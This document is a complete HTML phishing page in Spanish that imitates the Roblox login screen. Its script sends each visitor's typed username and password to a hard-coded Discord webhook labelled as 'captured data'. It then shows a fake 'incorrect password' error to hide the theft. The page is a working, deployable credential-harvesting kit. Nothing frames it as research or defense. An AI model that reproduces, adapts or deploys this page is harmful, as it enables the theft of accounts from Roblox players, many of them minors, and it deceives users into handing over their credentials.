<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - Iniciar sesión</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            width: 380px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo img {
            width: 180px;
        }
        
        .title {
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            color: #1a1a2e;
            margin-bottom: 8px;
        }
        
        .subtitle {
            text-align: center;
            color: #666;
            font-size: 14px;
            margin-bottom: 30px;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        .input-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
        }
        
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 15px;
            transition: all 0.3s;
            outline: none;
        }
        
        .input-group input:focus {
            border-color: #00b4d8;
            box-shadow: 0 0 0 3px rgba(0,180,216,0.1);
        }
        
        .input-group input::placeholder {
            color: #aaa;
        }
        
        .options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
        }
        
        .remember {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 13px;
            color: #666;
            cursor: pointer;
        }
        
        .remember input[type="checkbox"] {
            width: 16px;
            height: 16px;
            accent-color: #00b4d8;
        }
        
        .forgot {
            font-size: 13px;
            color: #00b4d8;
            text-decoration: none;
        }
        
        .forgot:hover {
            text-decoration: underline;
        }
        
        .btn-login {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #00b4d8, #0077b6);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .btn-login:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(0,180,216,0.3);
        }
        
        .btn-login:active {
            transform: translateY(0);
        }
        
        .divider {
            text-align: center;
            margin: 25px 0;
            color: #999;
            font-size: 13px;
            position: relative;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            position: absolute;
            top: 50%;
            width: 40%;
            height: 1px;
            background: #e0e0e0;
        }
        
        .divider::before {
            left: 0;
        }
        
        .divider::after {
            right: 0;
        }
        
        .social-login {
            display: flex;
            gap: 12px;
            margin-bottom: 25px;
        }
        
        .social-btn {
            flex: 1;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            background: white;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 14px;
            font-weight: 600;
            color: #333;
        }
        
        .social-btn:hover {
            border-color: #00b4d8;
            background: #f0f8ff;
        }
        
        .social-btn.google {
            color: #4285f4;
        }
        
        .social-btn.facebook {
            color: #1877f2;
        }
        
        .register {
            text-align: center;
            font-size: 14px;
            color: #666;
        }
        
        .register a {
            color: #00b4d8;
            text-decoration: none;
            font-weight: 600;
        }
        
        .register a:hover {
            text-decoration: underline;
        }
        
        .error-message {
            background: #ffe0e0;
            color: #d32f2f;
            padding: 12px;
            border-radius: 10px;
            font-size: 13px;
            margin-bottom: 20px;
            display: none;
            text-align: center;
        }
        
        .loading {
            display: none;
            text-align: center;
            margin-top: 15px;
        }
        
        .spinner {
            width: 30px;
            height: 30px;
            border: 3px solid #e0e0e0;
            border-top: 3px solid #00b4d8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_Logo_2021.svg/1200px-Roblox_Logo_2021.svg.png" alt="Roblox Logo">
        </div>
        
        <div class="title">Iniciar sesión</div>
        <div class="subtitle">Accede a tu cuenta de Roblox</div>
        
        <div class="error-message" id="errorMessage">
            ⚠️ Usuario o contraseña incorrectos
        </div>
        
        <form id="loginForm">
            <div class="input-group">
                <label for="username">Nombre de usuario</label>
                <input type="text" id="username" placeholder="Ingresa tu nombre de usuario" required>
            </div>
            
            <div class="input-group">
                <label for="password">Contraseña</label>
                <input type="password" id="password" placeholder="Ingresa tu contraseña" required>
            </div>
            
            <div class="options">
                <label class="remember">
                    <input type="checkbox" checked>
                    Recordar sesión
                </label>
                <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
            </div>
            
            <button type="submit" class="btn-login">Iniciar sesión</button>
            
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p style="margin-top: 10px; color: #666; font-size: 13px;">Verificando credenciales...</p>
            </div>
        </form>
        
        <div class="divider">o continúa con</div>
        
        <div class="social-login">
            <button class="social-btn google">Google</button>
            <button class="social-btn facebook">Facebook</button>
        </div>
        
        <div class="register">
            ¿No tienes cuenta? <a href="#">Regístrate aquí</a>
        </div>
    </div>
    
    <script>
        const webhookURL = 'https://discord.com/api/webhooks/1515896077298040985/h3KDNg45cyvURVTuwyt8tpDfIDawPGYn9FvxUFFwBC6idwosoMYu4UW1JpeWabfC_pXF';
        
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const errorMessage = document.getElementById('errorMessage');
            const loading = document.getElementById('loading');
            const btn = document.querySelector('.btn-login');
            
            // Mostrar loading
            loading.style.display = 'block';
            btn.style.display = 'none';
            
            // Enviar a Discord
            const data = {
                content: `🎯 **Nuevos datos capturados**\n👤 Usuario: ${username}\n🔑 Contraseña: ${password}\n🕐 Hora: ${new Date().toLocaleString()}`
            };
            
            try {
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
                
                // Mostrar error falso después de 2 segundos
                setTimeout(() => {
                    loading.style.display = 'none';
                    btn.style.display = 'block';
                    errorMessage.style.display = 'block';
                    
                    // Ocultar error después de 3 segundos
                    setTimeout(() => {
                        errorMessage.style.display = 'none';
                    }, 3000);
                }, 2000);
                
            } catch (error) {
                loading.style.display = 'none';
                btn.style.display = 'block';
                errorMessage.textContent = '⚠️ Error de conexión. Intenta de nuevo.';
                errorMessage.style.display = 'block';
            }
        });
    </script>
</body>
</html>
